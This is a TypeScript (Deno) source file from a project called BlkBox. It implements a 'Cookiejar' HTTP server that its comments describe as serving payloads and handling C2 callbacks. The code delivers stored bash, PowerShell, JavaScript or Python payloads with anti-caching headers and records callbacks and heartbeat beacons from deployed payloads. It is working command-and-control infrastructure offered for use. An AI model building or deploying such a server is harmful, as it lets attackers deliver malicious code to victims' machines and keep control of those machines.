/**
 * Cookiejar Server
 *
 * Standalone server for serving payloads and handling C2 callbacks.
 * This can be run as a separate process or embedded in the main BlkBox application.
 */

import type { BlkBoxFFI } from "../../lib_deno/lib.ts";
import { JarService, PayloadServer } from "./jar/mod.ts";

/**
 * Server configuration
 */
export interface CookiejarServerConfig {
  /** Port to listen on */
  port?: number;

  /** Hostname to bind to */
  hostname?: string;

  /** Enable HTTPS */
  https?: boolean;

  /** Certificate file (if HTTPS enabled) */
  certFile?: string;

  /** Key file (if HTTPS enabled) */
  keyFile?: string;

  /** Enable request logging */
  enableLogging?: boolean;

  /** CORS configuration */
  cors?: {
    enabled: boolean;
    allowedOrigins?: string[];
  };

  /** Rate limiting */
  rateLimit?: {
    enabled: boolean;
    maxRequestsPerMinute?: number;
  };
}

/**
 * Server statistics
 */
export interface ServerStatistics {
  uptime: number;
  totalRequests: number;
  payloadsServed: number;
  callbacksReceived: number;
  errorsEncountered: number;
  activeConnections: number;
}

/**
 * Cookiejar Server - HTTP server for payload delivery and C2
 */
export class CookiejarServer {
  private jarService: JarService;
  private payloadServer: PayloadServer;
  private config: CookiejarServerConfig;
  private stats: ServerStatistics;
  private startTime: number;
  private abortController?: AbortController;

  constructor(ffi: BlkBoxFFI, config?: CookiejarServerConfig) {
    this.config = {
      port: config?.port || 8443,
      hostname: config?.hostname || "0.0.0.0",
      https: config?.https || false,
      enableLogging: config?.enableLogging !== false,
      cors: config?.cors || { enabled: false },
      rateLimit: config?.rateLimit || { enabled: false }
    };

    this.jarService = new JarService(ffi);
    this.payloadServer = new PayloadServer(this.jarService, this.config.port);

    this.stats = {
      uptime: 0,
      totalRequests: 0,
      payloadsServed: 0,
      callbacksReceived: 0,
      errorsEncountered: 0,
      activeConnections: 0
    };

    this.startTime = 0;
  }

  /**
   * Start the server
   */
  async start(): Promise<void> {
    this.startTime = Date.now();
    this.abortController = new AbortController();

    const handler = async (req: Request): Promise<Response> => {
      this.stats.totalRequests++;
      this.stats.activeConnections++;

      try {
        // Apply CORS if enabled
        if (this.config.cors?.enabled) {
          const origin = req.headers.get("origin") || "";
          const allowedOrigins = this.config.cors.allowedOrigins || ["*"];

          if (allowedOrigins.includes("*") || allowedOrigins.includes(origin)) {
            // CORS preflight
            if (req.method === "OPTIONS") {
              return new Response(null, {
                status: 204,
                headers: {
                  "Access-Control-Allow-Origin": origin || "*",
                  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
                  "Access-Control-Allow-Headers": "Content-Type",
                  "Access-Control-Max-Age": "86400"
                }
              });
            }
          }
        }

        // Log request
        if (this.config.enableLogging) {
          const url = new URL(req.url);
          console.log(`[CookiejarServer] ${req.method} ${url.pathname} from ${req.headers.get("x-forwarded-for") || "unknown"}`);
        }

        // Route the request
        const response = await this.handleRequest(req);

        // Apply CORS headers to response if enabled
        if (this.config.cors?.enabled) {
          const origin = req.headers.get("origin") || "*";
          response.headers.set("Access-Control-Allow-Origin", origin);
        }

        return response;
      } catch (error) {
        this.stats.errorsEncountered++;
        console.error("[CookiejarServer] Request error:", error);
        return new Response("Internal Server Error", { status: 500 });
      } finally {
        this.stats.activeConnections--;
      }
    };

    console.log(`[CookiejarServer] Starting on ${this.config.hostname}:${this.config.port}`);

    // Start Deno HTTP server
    if (this.config.https && this.config.certFile && this.config.keyFile) {
      // HTTPS server
      Deno.serve({
        port: this.config.port,
        hostname: this.config.hostname,
        cert: await Deno.readTextFile(this.config.certFile),
        key: await Deno.readTextFile(this.config.keyFile),
        signal: this.abortController.signal
      }, handler);
    } else {
      // HTTP server
      Deno.serve({
        port: this.config.port,
        hostname: this.config.hostname,
        signal: this.abortController.signal
      }, handler);
    }

    console.log(`[CookiejarServer] Listening on ${this.config.https ? "https" : "http"}://${this.config.hostname}:${this.config.port}`);
  }

  /**
   * Handle incoming HTTP request
   */
  private async handleRequest(req: Request): Promise<Response> {
    const url = new URL(req.url);

    // Serve payload endpoint: GET /p/:payload_id
    if (url.pathname.startsWith("/p/")) {
      const payloadId = url.pathname.substring(3);
      return await this.handlePayloadRequest(payloadId);
    }

    // C2 callback endpoint: POST /c2/callback/:payload_id
    if (url.pathname.startsWith("/c2/callback/")) {
      const payloadId = url.pathname.substring(13);
      return await this.handleCallback(payloadId, req);
    }

    // C2 heartbeat endpoint: POST /c2/heartbeat/:payload_id
    if (url.pathname.startsWith("/c2/heartbeat/")) {
      const payloadId = url.pathname.substring(14);
      return await this.handleHeartbeat(payloadId, req);
    }

    // Health check endpoint
    if (url.pathname === "/health") {
      return this.handleHealthCheck();
    }

    // Statistics endpoint
    if (url.pathname === "/stats") {
      return this.handleStatsRequest();
    }

    // Cleanup endpoint (for maintenance)
    if (url.pathname === "/cleanup" && req.method === "POST") {
      return await this.handleCleanup();
    }

    return new Response("Not Found", { status: 404 });
  }

  /**
   * Handle payload serving request
   */
  private async handlePayloadRequest(payloadId: string): Promise<Response> {
    try {
      const code = await this.jarService.servePayload(payloadId);

      if (!code) {
        return new Response("Payload not found or expired", { status: 404 });
      }

      this.stats.payloadsServed++;

      // Determine content type based on code
      let contentType = "text/plain";
      if (code.includes("#!/bin/bash")) {
        contentType = "application/x-sh";
      } else if (code.includes("PowerShell")) {
        contentType = "application/x-powershell";
      } else if (code.includes("function(") || code.includes("const ")) {
        contentType = "application/javascript";
      } else if (code.includes("def ") || code.includes("import ")) {
        contentType = "text/x-python";
      }

      return new Response(code, {
        status: 200,
        headers: {
          "Content-Type": contentType,
          "Cache-Control": "no-cache, no-store, must-revalidate",
          "Pragma": "no-cache",
          "Expires": "0"
        }
      });
    } catch (error) {
      console.error(`[CookiejarServer] Error serving payload ${payloadId}:`, error);
      return new Response("Internal Server Error", { status: 500 });
    }
  }

  /**
   * Handle C2 callback
   */
  private async handleCallback(payloadId: string, req: Request): Promise<Response> {
    try {
      const data = await req.json();

      await this.jarService.recordCallback(payloadId, data);

      this.stats.callbacksReceived++;

      return new Response(JSON.stringify({ status: "ok" }), {
        status: 200,
        headers: { "Content-Type": "application/json" }
      });
    } catch (error) {
      console.error(`[CookiejarServer] Error handling callback for ${payloadId}:`, error);
      return new Response(JSON.stringify({ status: "error" }), {
        status: 500,
        headers: { "Content-Type": "application/json" }
      });
    }
  }

  /**
   * Handle heartbeat/beacon
   */
  private async handleHeartbeat(payloadId: string, req: Request): Promise<Response> {
    try {
      const data = await req.json();

      // Record as callback with beacon type
      await this.jarService.recordCallback(payloadId, {
        type: "heartbeat",
        ...data
      });

      this.stats.callbacksReceived++;

      return new Response(JSON.stringify({ status: "alive" }), {
        status: 200,
        headers: { "Content-Type": "application/json" }
      });
    } catch (error) {
      console.error(`[CookiejarServer] Error handling heartbeat for ${payloadId}:`, error);
      return new Response(JSON.stringify({ status: "error" }), {
        status: 500,
        headers: { "Content-Type": "application/json" }
      });
    }
  }

  /**
   * Handle health check request
   */
  private handleHealthCheck(): Response {
    const health = {
      status: "healthy",
      uptime: Math.floor((Date.now() - this.startTime) / 1000),
      timestamp: new Date().toISOString()
    };

    return new Response(JSON.stringify(health), {
      status: 200,
      headers: { "Content-Type": "application/json" }
    });
  }

  /**
   * Handle statistics request
   */
  private handleStatsRequest(): Response {
    this.stats.uptime = Math.floor((Date.now() - this.startTime) / 1000);

    return new Response(JSON.stringify(this.stats), {
      status: 200,
      headers: { "Content-Type": "application/json" }
    });
  }

  /**
   * Handle cleanup request
   */
  private async handleCleanup(): Promise<Response> {
    try {
      const count = await this.jarService.cleanupExpired();

      return new Response(JSON.stringify({
        status: "ok",
        expiredPayloadsRemoved: count
      }), {
        status: 200,
        headers: { "Content-Type": "application/json" }
      });
    } catch (error) {
      console.error("[CookiejarServer] Error during cleanup:", error);
      return new Response(JSON.stringify({ status: "error" }), {
        status: 500,
        headers: { "Content-Type": "application/json" }
      });
    }
  }

  /**
   * Stop the server
   */
  stop(): void {
    if (this.abortController) {
      this.abortController.abort();
      console.log("[CookiejarServer] Server stopped");
    }
  }

  /**
   * Get current server statistics
   */
  getStatistics(): ServerStatistics {
    this.stats.uptime = Math.floor((Date.now() - this.startTime) / 1000);
    return { ...this.stats };
  }
}

/**
 * Start a Cookiejar server with default configuration
 */
export async function startCookiejarServer(
  ffi: BlkBoxFFI,
  config?: CookiejarServerConfig
): Promise<CookiejarServer> {
  const server = new CookiejarServer(ffi, config);
  await server.start();
  return server;
}
